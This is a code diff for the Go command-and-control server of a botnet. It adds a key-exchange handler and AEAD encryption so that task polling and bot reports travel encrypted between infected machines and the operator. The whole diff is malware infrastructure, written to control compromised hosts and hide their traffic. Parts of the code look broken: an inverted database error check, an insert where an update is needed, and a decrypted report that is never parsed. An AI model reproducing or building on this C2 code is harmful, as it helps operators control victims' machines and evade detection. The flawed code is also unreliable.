@@ -7,6 +7,7 @@ import (
 	"database/sql"
 	"encoding/json"
 	"fmt"
+	"io"
 	"log"
 	"net/http"
 	"strconv"
@@ -96,6 +97,7 @@ func poll_handler(w http.ResponseWriter, r *http.Request) {
 	var saved_guid string
 	var saved_token string
 	var saved_lastseen string
+	var saved_aead_key string
 	var saved_botid int
 	reply := common.ServerReply{
 		Args: make(map[string]any),
@@ -139,8 +141,8 @@ func poll_handler(w http.ResponseWriter, r *http.Request) {
 	}
 
 ReadyPoll:
-	sqlStr = "select id, guid, token, lastseen from clients where guid=?"
-	err = db1.QueryRow(common.Db, sqlStr, guid).Scan(&saved_botid, &saved_guid, &saved_token, &saved_lastseen)
+	sqlStr = "select id, guid, token, lastseen, aead_key from clients where guid=?"
+	err = db1.QueryRow(common.Db, sqlStr, guid).Scan(&saved_botid, &saved_guid, &saved_token, &saved_lastseen, &saved_aead_key)
 	if err == sql.ErrNoRows {
 		// Can't find bot
 		log.Println("can't find bot in poll handler" + err.Error())
@@ -196,7 +198,7 @@ ReadyPoll:
 			}
 		}
 	}
-	err = http_sender(w, guid, saved_token, &reply)
+	err = http_sender_enc(w, guid, saved_token, saved_aead_key, &reply)
 	if err != nil {
 		log.Println(err.Error())
 	}
@@ -210,6 +212,75 @@ func login_handler(w http.ResponseWriter, r *http.Request) {
 
 }
 
+func key_handler(w http.ResponseWriter, r *http.Request) {
+	log.Println("key_handler triggered")
+
+	guid := r.Header.Get("X-Guid")
+	time := r.Header.Get("X-Time")
+	sign := r.Header.Get("X-Sign")
+
+	var ok bool = true
+	sqlStr := "select token, aead_key from clients where guid=?"
+	saved_token := ""
+	saved_key := ""
+
+	var bytToken []byte
+	var dec_key []byte
+	var enc_str_key string
+	var bytBody []byte
+
+	// Check the legality of package
+	err := db1.QueryRow(common.Db, sqlStr, guid).Scan(&saved_token, &saved_key)
+	if err != sql.ErrNoRows {
+		fmt.Println("[💀] Can't find bot in report hander")
+		ok = false
+		goto ReplySent
+	} else if err != nil {
+		fmt.Println("[💀] Unknown error")
+		ok = false
+		goto ReplySent
+	}
+	if !check_package_legality(guid, saved_token, sign, time) {
+		fmt.Println("[💀] Illegal package")
+		ok = false
+		goto ReplySent
+	}
+	// Get AEAD key
+	bytToken, _ = common.Base64Dec(saved_token)
+	bytBody, _ = io.ReadAll(r.Body)
+	defer r.Body.Close()
+
+	dec_key = common.DecChacha20(bytToken, bytBody)
+	enc_str_key = common.Base64Enc(dec_key)
+	// Save the key
+	sqlStr = "insert into clients (aead_key) values(?)"
+	_, err = db1.Insert(common.Db, sqlStr, enc_str_key)
+	if err != nil {
+		fmt.Println("[💀] Failed to save key")
+		return
+	}
+ReplySent:
+	var strErr string
+	var status int
+	if !ok {
+		status = 0
+		strErr = "Can't share key"
+	} else {
+		status = 1
+		strErr = ""
+	}
+
+	var reply common.ServerReply = common.ServerReply{
+		Cmd:     "ShareKey",
+		Error:   strErr,
+		Status:  status,
+		Args:    map[string]any{},
+		TaskId:  0,
+		Headers: map[string]string{},
+	}
+	http_sender(w, guid, saved_token, &reply)
+}
+
 func report_handler(w http.ResponseWriter, r *http.Request) {
 	log.Println("report_handler triggered")
 
@@ -221,8 +292,9 @@ func report_handler(w http.ResponseWriter, r *http.Request) {
 	saved_token := ""
 	saved_id := 0
 	saved_ip := ""
-	sqlStr := "select id, token, ip from clients where guid=?"
-	err := db1.QueryRow(common.Db, sqlStr, guid).Scan(&saved_id, &saved_token, &saved_ip)
+	saved_aead_key := ""
+	sqlStr := "select id, token, ip, aead_key from clients where guid=?"
+	err := db1.QueryRow(common.Db, sqlStr, guid).Scan(&saved_id, &saved_token, &saved_ip, &saved_aead_key)
 	if err == sql.ErrNoRows {
 		fmt.Println("[💀] Can't find bot in report hander")
 		return
@@ -238,12 +310,21 @@ func report_handler(w http.ResponseWriter, r *http.Request) {
 
 	// Parse the report
 	var report common.Report
-	err = json.NewDecoder(r.Body).Decode(&report)
+	bytAEAD, err := io.ReadAll(r.Body)
 	if err != nil {
-		fmt.Println("[💀] Failed to read the report")
+		fmt.Println("[💀] Failed to read the report body")
 		return
 	}
 	defer r.Body.Close()
+
+	aead_key, _ := common.Base64Dec(saved_aead_key)
+	nonce := bytAEAD[:12]
+	body := bytAEAD[12:]
+	body, err = common.Dec_AEAD(aead_key, nonce, body, []byte(time1))
+	if err != nil || body == nil {
+		log.Printf("[💀] Failed in aead decription\n")
+		return
+	}
 	// Find the task and update it's status
 	status := "done"
 	if !report.Success {
